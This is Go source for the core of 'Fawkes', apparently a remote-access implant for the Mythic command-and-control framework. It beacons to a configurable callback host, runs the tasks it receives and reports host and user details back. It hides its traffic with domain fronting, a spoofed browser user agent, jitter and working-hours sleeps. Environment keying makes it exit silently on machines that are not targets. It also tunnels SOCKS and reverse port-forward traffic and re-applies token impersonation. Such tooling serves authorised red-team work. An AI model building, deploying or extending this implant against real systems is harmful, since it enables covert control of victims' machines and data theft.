package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"

	"fawkes/pkg/commands"
	"fawkes/pkg/files"
	"fawkes/pkg/http"
	"fawkes/pkg/profiles"
	"fawkes/pkg/rpfwd"
	"fawkes/pkg/socks"
	"fawkes/pkg/structs"
	"fawkes/pkg/tcp"
)

var (
	// These variables are populated at build time by the Go linker
	payloadUUID  string = ""
	callbackHost string = ""
	callbackPort  string = "443"
	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	sleepInterval string = "10"
	jitter        string = "10"
	encryptionKey string = ""
	killDate      string = "0"
	maxRetries    string = "10"
	debug         string = "false"
	getURI        string = "/data"
	postURI       string = "/data"
	hostHeader        string = ""     // Override Host header for domain fronting
	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
	envKeyHostname    string = ""     // Environment key: hostname must match this regex
	envKeyDomain      string = ""     // Environment key: domain must match this regex
	envKeyUsername    string = ""     // Environment key: username must match this regex
	envKeyProcess     string = ""     // Environment key: this process must be running
)

func main() {
	runAgent()
}

func runAgent() {
	// Convert string build variables to appropriate types with validation
	callbackPortInt, err := strconv.Atoi(callbackPort)
	if err != nil {
		log.Printf("[WARNING] Invalid callbackPort %q, defaulting to 443", callbackPort)
		callbackPortInt = 443
	}
	sleepIntervalInt, err := strconv.Atoi(sleepInterval)
	if err != nil || sleepIntervalInt < 0 {
		log.Printf("[WARNING] Invalid sleepInterval %q, defaulting to 10", sleepInterval)
		sleepIntervalInt = 10
	}
	jitterInt, err := strconv.Atoi(jitter)
	if err != nil || jitterInt < 0 || jitterInt > 100 {
		log.Printf("[WARNING] Invalid jitter %q, defaulting to 10", jitter)
		jitterInt = 10
	}
	killDateInt64, err := strconv.ParseInt(killDate, 10, 64)
	if err != nil {
		log.Printf("[WARNING] Invalid killDate %q, defaulting to 0 (disabled)", killDate)
		killDateInt64 = 0
	}
	maxRetriesInt, err := strconv.Atoi(maxRetries)
	if err != nil || maxRetriesInt < 0 {
		log.Printf("[WARNING] Invalid maxRetries %q, defaulting to 10", maxRetries)
		maxRetriesInt = 10
	}
	debugBool, err := strconv.ParseBool(debug)
	if err != nil {
		debugBool = false
	}

	// Setup logging
	if debugBool {
		log.SetOutput(os.Stdout)
		// log.Println("[DEBUG] Starting Fawkes agent")
	}

	// Verify required configuration
	if payloadUUID == "" {
		payloadUUID = uuid.New().String()
		log.Printf("[WARNING] No payload UUID provided, generated: %s", payloadUUID)
	}

	// Check kill date
	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
		log.Printf("[INFO] Agent past kill date, exiting")
		os.Exit(0)
	}

	// Check environment keys — exit silently if any check fails (no network activity)
	if !checkEnvironmentKeys() {
		os.Exit(0)
	}

	// Parse working hours configuration
	whStartMinutes := 0
	whEndMinutes := 0
	var whDays []int
	if workingHoursStart != "" {
		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
			log.Printf("[WARNING] Invalid workingHoursStart %q: %v", workingHoursStart, err)
		} else {
			whStartMinutes = parsed
		}
	}
	if workingHoursEnd != "" {
		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
			log.Printf("[WARNING] Invalid workingHoursEnd %q: %v", workingHoursEnd, err)
		} else {
			whEndMinutes = parsed
		}
	}
	if workingDays != "" {
		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
			log.Printf("[WARNING] Invalid workingDays %q: %v", workingDays, err)
		} else {
			whDays = parsed
		}
	}

	// Initialize the agent
	agent := &structs.Agent{
		PayloadUUID:       payloadUUID,
		Architecture:      runtime.GOARCH,
		Domain:            "",
		ExternalIP:        "",
		Host:              getHostname(),
		Integrity:         getIntegrityLevel(),
		InternalIP:        getInternalIP(),
		OS:                getOperatingSystem(),
		PID:               os.Getpid(),
		ProcessName:       os.Args[0],
		SleepInterval:     sleepIntervalInt,
		Jitter:            jitterInt,
		User:              getUsername(),
		Description:       fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
		WorkingHoursStart: whStartMinutes,
		WorkingHoursEnd:   whEndMinutes,
		WorkingDays:       whDays,
	}

	// Initialize C2 profile based on configuration
	var c2 profiles.Profile

	if tcpBindAddress != "" {
		// TCP P2P mode — this agent is a child that listens for a parent connection
		log.Printf("[INFO] TCP P2P mode: binding to %s", tcpBindAddress)
		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
		c2 = profiles.NewTCPProfile(tcpProfile)
		// Make TCP profile available to link/unlink commands
		commands.SetTCPProfile(tcpProfile)
	} else {
		// HTTP egress mode (default)
		var callbackURL string
		if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
			callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
		} else {
			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
		}

		httpProfile := http.NewHTTPProfile(
			callbackURL,
			userAgent,
			encryptionKey,
			maxRetriesInt,
			sleepIntervalInt,
			jitterInt,
			debugBool,
			getURI,
			postURI,
			hostHeader,
			proxyURL,
			tlsVerify,
		)
		c2 = profiles.NewProfile(httpProfile)

		// Also create a TCP profile instance for P2P child management.
		// Even HTTP egress agents can link to TCP children.
		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
		commands.SetTCPProfile(tcpP2P)

		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
		httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
			return tcpP2P.DrainDelegatesOnly()
		}
		httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
			return tcpP2P.DrainDelegatesAndEdges()
		}
		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
			tcpP2P.RouteToChildren(delegates)
		}

		// Wire up rpfwd hooks for reverse port forwarding
		rpfwdManager := rpfwd.NewManager()
		commands.SetRpfwdManager(rpfwdManager)
		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
	}

	// Initialize command handlers
	commands.Initialize()

	// Initialize file transfer goroutines
	files.Initialize()

	// Initial checkin
	log.Printf("[INFO] Starting initial checkin...")
	if err := c2.Checkin(agent); err != nil {
		log.Printf("[ERROR] Initial checkin failed: %v", err)
		return
	}
	log.Printf("[INFO] Initial checkin successful")

	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.CallbackUUID == "" {
		tcpP2P.CallbackUUID = c2.GetCallbackUUID()
	}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(sigChan)

	go func() {
		sig := <-sigChan
		log.Printf("[INFO] Received signal: %v, shutting down gracefully", sig)
		cancel()
	}()

	// Initialize SOCKS proxy manager
	socksManager := socks.NewManager()

	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, killDateInt64)
	usePadding() // Reference embedded padding to prevent compiler stripping
	log.Printf("[INFO] Fawkes agent shutdown complete")
}

func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, killDateUnix int64) {
	// Main execution loop
	retryCount := 0
	for {
		select {
		case <-ctx.Done():
			log.Printf("[INFO] Context cancelled, exiting main loop")
			return
		default:
			// Enforce kill date every cycle — exit silently if past expiry
			if killDateUnix > 0 && time.Now().Unix() > killDateUnix {
				log.Printf("[INFO] Kill date reached, exiting")
				return
			}

			// Enforce working hours — sleep until next working period if outside hours
			if agent.WorkingHoursEnabled() && !agent.IsWithinWorkingHours(time.Now()) {
				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
				if waitMinutes > 0 {
					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
					jitterSeconds := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterSeconds
					log.Printf("[INFO] Outside working hours, sleeping %v until next work period", sleepDuration)
					time.Sleep(sleepDuration)
					continue
				}
			}

			// Drain any pending outbound SOCKS data to include in this poll
			outboundSocks := socksManager.DrainOutbound()

			// Get tasks and inbound SOCKS data from C2 server
			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
			if err != nil {
				log.Printf("[ERROR] Failed to get tasking: %v", err)
				retryCount++
				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
				backoffSeconds := agent.SleepInterval * backoffMultiplier
				maxBackoff := 300 // 5 minutes cap
				if backoffSeconds > maxBackoff {
					backoffSeconds = maxBackoff
				}
				sleepTime := calculateSleepTime(backoffSeconds, agent.Jitter)
				time.Sleep(sleepTime)
				continue
			}

			// Reset retry count on successful communication
			retryCount = 0

			// Pass inbound SOCKS messages to the manager for processing
			if len(inboundSocks) > 0 {
				socksManager.HandleMessages(inboundSocks)
			}

			// Process tasks
			for _, task := range tasks {
				processTaskWithAgent(task, agent, c2, socksManager)
			}

			// Sleep before next iteration
			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
			time.Sleep(sleepTime)
		}
	}
}

func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)

	// Create Job struct with channels for this task
	job := &structs.Job{
		Stop:              new(int),
		SendResponses:     make(chan structs.Response, 100),
		SendFileToMythic:  files.SendToMythicChannel,
		GetFileFromMythic: files.GetFromMythicChannel,
		FileTransfers:     make(map[string]chan json.RawMessage),
	}
	task.Job = job

	// Start goroutine to forward responses from the job to Mythic
	done := make(chan bool)
	var forwarderWg sync.WaitGroup
	forwarderWg.Add(1)
	go func() {
		defer forwarderWg.Done()
		for {
			select {
			case resp := <-job.SendResponses:
				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
				if err != nil {
					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
					continue
				}

				// If this is a file transfer response, route Mythic's response back
				if len(mythicResp) > 0 && (resp.Upload != nil || resp.Download != nil) {
					// Parse the response to get tracking info
					var responseData map[string]interface{}
					if err := json.Unmarshal(mythicResp, &responseData); err == nil {
						// Look for responses array
						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
							if firstResp, ok := responses[0].(map[string]interface{}); ok {
								// Send this response to all active file transfer channels
								respJSON, err := json.Marshal(firstResp)
								if err != nil {
									log.Printf("[ERROR] Failed to marshal file transfer response: %v", err)
									continue
								}
								job.BroadcastFileTransfer(json.RawMessage(respJSON))
							}
						}
					}
				}
			case <-done:
				// Drain any remaining responses
				for {
					select {
					case resp := <-job.SendResponses:
						_, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
						if err != nil {
							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
						}
					default:
						return
					}
				}
			}
		}
	}()

	// Get command handler
	handler := commands.GetCommand(task.Command)
	if handler == nil {
		response := structs.Response{
			TaskID:     task.ID,
			Status:     "error",
			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
			Completed:  true,
		}
		if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
			log.Printf("[ERROR] Failed to post response: %v", err)
		}
		close(done)
		return
	}

	// Re-apply token impersonation if active (handles Go thread migration)
	commands.PrepareExecution()

	// Execute command with panic recovery to prevent agent crash
	var result structs.CommandResult
	func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[ERROR] Command %s panicked: %v", task.Command, r)
				result = structs.CommandResult{
					Output:    fmt.Sprintf("Command panicked: %v", r),
					Status:    "error",
					Completed: true,
				}
			}
		}()
		if agentHandler, ok := handler.(structs.AgentCommand); ok {
			result = agentHandler.ExecuteWithAgent(task, agent)
		} else {
			result = handler.Execute(task)
		}
	}()

	// Send final response
	response := structs.Response{
		TaskID:     task.ID,
		UserOutput: result.Output,
		Status:     result.Status,
		Completed:  result.Completed,
		Processes:  result.Processes,
	}
	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
		log.Printf("[ERROR] Failed to post response: %v", err)
	}

	// Signal the response forwarder to finish and wait for it to drain
	close(done)
	forwarderWg.Wait()
}

func calculateSleepTime(interval, jitter int) time.Duration {
	if jitter == 0 {
		return time.Duration(interval) * time.Second
	}

	// Freyja-style jitter calculation
	// Jitter is a percentage (0-100) that creates variation around the interval
	jitterFloat := float64(rand.Intn(jitter)) / float64(100)
	jitterDiff := float64(interval) * jitterFloat

	// Randomly add or subtract jitter (50/50 chance)
	if rand.Intn(2) == 0 {
		// Add jitter
		actualInterval := interval + int(jitterDiff)
		return time.Duration(actualInterval) * time.Second
	} else {
		// Subtract jitter
		actualInterval := interval - int(jitterDiff)
		if actualInterval < 1 {
			actualInterval = 1 // Minimum 1 second
		}
		return time.Duration(actualInterval) * time.Second
	}
}

// Helper functions for system information
func getHostname() string {
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}
	return "unknown"
}

func getUsername() string {
	if user := os.Getenv("USER"); user != "" {
		return user
	}
	if user := os.Getenv("USERNAME"); user != "" {
		return user
	}
	return "unknown"
}

func getOperatingSystem() string {
	return runtime.GOOS
}

func getInternalIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}
	for _, iface := range ifaces {
		// Skip loopback and down interfaces
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			// Prefer IPv4
			if ip4 := ip.To4(); ip4 != nil {
				return ip4.String()
			}
		}
	}
	return "127.0.0.1"
}

// checkEnvironmentKeys validates all configured environment keys.
// Returns true if all checks pass (or no keys configured). Returns false if any check fails.
// On failure, the agent should exit silently — no logging, no network activity.
func checkEnvironmentKeys() bool {
	if envKeyHostname != "" {
		hostname, _ := os.Hostname()
		if !regexMatch(envKeyHostname, hostname) {
			return false
		}
	}
	if envKeyDomain != "" {
		domain := getEnvironmentDomain()
		if !regexMatch(envKeyDomain, domain) {
			return false
		}
	}
	if envKeyUsername != "" {
		username := getUsername()
		if !regexMatch(envKeyUsername, username) {
			return false
		}
	}
	if envKeyProcess != "" {
		if !isProcessRunning(envKeyProcess) {
			return false
		}
	}
	return true
}

// regexMatch performs a case-insensitive full-string regex match.
func regexMatch(pattern, value string) bool {
	// Anchor the pattern to match the full string
	anchored := "(?i)^(?:" + pattern + ")$"
	re, err := regexp.Compile(anchored)
	if err != nil {
		// Invalid regex — fail closed (don't execute)
		return false
	}
	return re.MatchString(value)
}
